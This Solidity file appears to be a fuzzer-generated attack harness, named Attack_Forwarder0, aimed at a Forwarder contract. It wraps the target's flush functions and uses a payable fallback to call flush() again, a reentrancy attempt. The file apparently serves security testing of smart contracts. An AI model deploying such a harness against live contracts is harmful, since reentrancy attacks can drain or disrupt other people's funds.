pragma solidity ^0.4.19;

import "/home/osboxes/vultron/contracts/Forwarder.sol";

contract Attack_Forwarder0 {

  Forwarder public target_contract;

  function Attack_Forwarder0(address _targetContract) public payable {
      target_contract = Forwarder(_targetContract);
  } 

  function vultron_flushTokens(address tokenContractAddress) public {
    target_contract.flushTokens(tokenContractAddress);
  } 

  function vultron_flush() public {
    target_contract.flush();
  } 

      function() public payable {
        
        target_contract.flush();
      }
      } 
